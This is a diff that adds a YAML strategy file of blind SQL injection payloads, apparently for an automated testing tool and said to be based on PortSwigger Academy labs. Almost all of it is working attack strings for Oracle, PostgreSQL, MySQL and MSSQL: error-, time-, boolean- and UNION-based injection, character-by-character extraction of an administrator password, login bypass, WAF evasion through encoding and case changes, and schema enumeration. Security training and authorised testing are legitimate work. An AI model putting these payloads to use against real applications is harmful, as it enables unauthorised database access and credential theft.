@@ -1,0 +1,316 @@
+# Advanced Blind SQL Injection Strategies
+# Based on PortSwigger WebSecurity Academy labs
+# Supports all major blind SQLi techniques
+
+strategies:
+  # ========== CONDITIONAL ERROR DETECTION ==========
+  - name: oracle_conditional_error
+    description2: "Oracle - Error-based blind SQLi (500 error = TRUE)"
+    target: query
+    param_hint: TrackingId
+    database: oracle
+    detection:
+      type: conditional_error
+      threshold: 500
+    payloads:
+      - "'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END)||'"
+      - "'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual)||'"
+    extraction:
+      - "'||(SELECT CASE WHEN (LENGTH(password)=10) THEN to_char(1/0) ELSE NULL END FROM users WHERE username='administrator')||'"
+  
+  - name: postgresql_conditional_error
+    description: "PostgreSQL - Error-based blind SQLi"
+    target: query
+    database: postgresql
+    detection:
+      type: conditional_error
+      threshold: 500
+    payloads:
+      - "'||(SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)||'"
+      - "'||(SELECT CASE WHEN (1=1) THEN 1/CAST(0 AS INTEGER) ELSE NULL END)||'"
+  
+  - name: mysql_conditional_error
+    description: "MySQL - Error-based blind SQLi with extractvalue"
+    target: query
+    database: mysql
+    detection:
+      type: error_keywords
+      keywords: ['Subquery returns', 'near the syntax', 'XPATH syntax']
+    payloads:
+      - "' AND extractvalue(0x0a, CONCAT(0x7e, (SELECT 1)))--"
+      - "' AND updatexml(0, CONCAT(0x7e, (SELECT 1)), 0)--"
+  
+  # ========== CONDITIONAL RESPONSE ==========
+  - name: postgresql_conditional_response
+    description: "PostgreSQL - Response-based blind (keyword presence)"
+    target: query
+    param_hint: TrackingId
+    database: postgresql
+    detection:
+      type: tracking_cookie
+      keyword: "Welcome back!"
+    payloads:
+      - "' AND 1=1--"
+      - "' AND (SELECT 'x' FROM users LIMIT 1)='x'--"
+  
+  - name: mysql_conditional_response
+    description: "MySQL - Boolean-based with response difference"
+    target: query
+    database: mysql
+    detection:
+      type: boolean_blind
+      threshold: 100
+    payloads:
+      - "' AND 1=1--"
+      - "' AND 1=2--"
+  
+  # ========== TIME-BASED BLIND ==========
+  - name: postgresql_time_delay
+    description: "PostgreSQL - Time-based blind injection"
+    target: query
+    param_hint: TrackingId
+    database: postgresql
+    detection:
+      type: time_delay
+      threshold: 5
+    payloads:
+      - "'||(SELECT pg_sleep(10))||'"
+      - "'; SELECT pg_sleep(10); --"
+    extraction:
+      - "'||(SELECT pg_sleep(5) FROM users WHERE username='administrator' AND LENGTH(password)=10)||'"
+      - "'||(SELECT pg_sleep(5) FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a')||'"
+  
+  - name: mysql_time_delay
+    description: "MySQL - Time-based blind with SLEEP"
+    target: query
+    database: mysql
+    detection:
+      type: time_delay
+      threshold: 5
+    payloads:
+      - "' AND SLEEP(10)--"
+      - "' AND (SELECT * FROM (SELECT(SLEEP(10)))x)--"
+  
+  - name: oracle_time_delay
+    description: "Oracle - Time-based blind with DBMS_LOCK"
+    target: query
+    database: oracle
+    detection:
+      type: time_delay
+      threshold: 5
+    payloads:
+      - "'||(SELECT DBMS_LOCK.SLEEP(10))||'"
+      - "' AND DBMS_LOCK.SLEEP(10)--"
+  
+  - name: mssql_time_delay
+    description: "MSSQL - Time-based blind with WAITFOR"
+    target: query
+    database: mssql
+    detection:
+      type: time_delay
+      threshold: 5
+    payloads:
+      - "' AND WAITFOR DELAY '00:00:10'--"
+  
+  # ========== BOOLEAN-BASED BLIND ==========
+  - name: boolean_basic
+    description: "Basic boolean-based blind detection"
+    target: query
+    database: null
+    detection:
+      type: boolean_blind
+      threshold: 50
+    payloads:
+      - "' AND 1=1--"
+      - "' AND 1=2--"
+      - "' OR 1=1--"
+      - "' OR 1=2--"
+  
+  - name: boolean_with_condition
+    description: "Boolean-based with explicit condition"
+    target: query
+    database: postgresql
+    detection:
+      type: keyword_presence
+      keyword: "Welcome back!"
+    payloads:
+      - "' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--"
+      - "' AND (SELECT COUNT(*) FROM users)>0--"
+  
+  # ========== UNION-BASED ==========
+  - name: union_basic_2columns
+    description: "UNION-based injection - 2 columns"
+    target: query
+    database: null
+    detection:
+      type: union_based
+      marker: "NULL"
+    payloads:
+      - "' UNION SELECT NULL, NULL--"
+      - "' UNION ALL SELECT NULL, NULL--"
+  
+  - name: union_extraction_postgresql
+    description: "PostgreSQL - UNION-based data extraction"
+    target: query
+    database: postgresql
+    detection:
+      type: keyword_presence
+      keyword: "administrator"
+    payloads:
+      - "' UNION SELECT username, password FROM users--"
+      - "' UNION SELECT table_name, null FROM information_schema.tables--"
+  
+  - name: union_extraction_oracle
+    description: "Oracle - UNION-based data extraction"
+    target: query
+    database: oracle
+    detection:
+      type: keyword_presence
+      keyword: "administrator"
+    payloads:
+      - "' UNION SELECT username, password FROM users--"
+      - "' UNION SELECT table_name, null FROM all_tables--"
+  
+  - name: union_extraction_mysql
+    description: "MySQL - UNION-based data extraction"
+    target: query
+    database: mysql
+    detection:
+      type: keyword_presence
+      keyword: "administrator"
+    payloads:
+      - "' UNION SELECT username, password FROM users--"
+      - "' UNION SELECT table_name, null FROM information_schema.tables--"
+  
+  # ========== LOGIN BYPASS ==========
+  - name: login_bypass_comment
+    description: "Login bypass using comment injection"
+    target: post
+    param_hint: ['username', 'password']
+    database: null
+    detection:
+      type: keyword_presence
+      keyword: "Your username is: administrator"
+    payloads:
+      - "' OR '1'='1' --"
+      - "' OR 1=1--"
+      - "admin' --"
+      - "admin' /*"
+  
+  - name: login_bypass_union
+    description: "Login bypass using UNION injection"
+    target: post
+    database: null
+    detection:
+      type: keyword_presence
+      keyword: "Your username is"
+    payloads:
+      - "' UNION SELECT 'administrator', 'password'--"
+  
+  # ========== WAF BYPASS ==========
+  - name: xml_encoding_bypass
+    description: "XML entity encoding bypass"
+    target: xml
+    xml_param: storeId
+    database: null
+    detection:
+      type: keyword_presence
+      keyword: "administrator"
+    payloads:
+      - "&#49;&#32;&#79;&#82;&#32;&#49;&#61;&#49;"  # "1 OR 1=1"
+      - "&#97;&#100;&#109;&#105;&#110;&#39;&#32;&#45;&#45;"  # "admin' --"
+  
+  - name: case_insensitive_bypass
+    description: "Case variation bypass"
+    target: query
+    database: null
+    detection:
+      type: length_delta
+      min_delta: 200
+    payloads:
+      - "' UnIoN SeLeCt NULL, NULL--"
+      - "' oR 1=1--"
+      - "' AnD 1=1--"
+  
+  - name: comment_variation_bypass
+    description: "Comment style variations"
+    target: query
+    database: null
+    detection:
+      type: length_delta
+      min_delta: 200
+    payloads:
+      - "' OR 1=1 -- -"
+      - "' OR 1=1 ;--"
+      - "' OR 1=1 /*"
+      - "' OR 1=1 #"
+  
+  # ========== DATABASE ENUMERATION ==========
+  - name: postgresql_enumeration
+    description: "PostgreSQL - Database structure enumeration"
+    target: query
+    database: postgresql
+    detection:
+      type: keyword_presence
+      keyword: "users_"
+    payloads:
+      - "' UNION SELECT table_name, null FROM information_schema.tables--"
+      - "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--"
+  
+  - name: mysql_enumeration
+    description: "MySQL - Database structure enumeration"
+    target: query
+    database: mysql
+    detection:
+      type: keyword_presence
+      keyword: "users_"
+    payloads:
+      - "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()--"
+      - "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--"
+  
+  - name: oracle_enumeration
+    description: "Oracle - Database structure enumeration"
+    target: query
+    database: oracle
+    detection:
+      type: keyword_presence
+      keyword: "USERS_"
+    payloads:
+      - "' UNION SELECT table_name, null FROM all_tables--"
+      - "' UNION SELECT column_name, null FROM all_tab_columns WHERE table_name='USERS'--"
+  
+  # ========== COOKIE-BASED INJECTION ==========
+  - name: tracking_cookie_injection
+    description: "Blind SQLi in tracking cookie"
+    target: cookie
+    cookie_name: TrackingId
+    database: postgresql
+    detection:
+      type: tracking_cookie
+      keyword: "Welcome back!"
+    payloads:
+      - "' AND 1=1--"
+      - "'||(SELECT pg_sleep(5))||'"
+  
+  # ========== ADVANCED EXTRACTION ==========
+  - name: character_extraction
+    description: "Extract password one character at a time"
+    target: query
+    database: postgresql
+    detection:
+      type: time_delay
+      threshold: 5
+    payloads:
+      - "'||(SELECT pg_sleep(5) FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a')||'"
+      - "'||(SELECT pg_sleep(5) FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='b')||'"
+  
+  - name: length_detection
+    description: "Detect password length via timing"
+    target: query
+    database: postgresql
+    detection:
+      type: time_delay
+      threshold: 5
+    payloads:
+      - "'||(SELECT pg_sleep(5) FROM users WHERE username='administrator' AND LENGTH(password)=10)||'"
+      - "'||(SELECT pg_sleep(5) FROM users WHERE username='administrator' AND LENGTH(password)=15)||'"
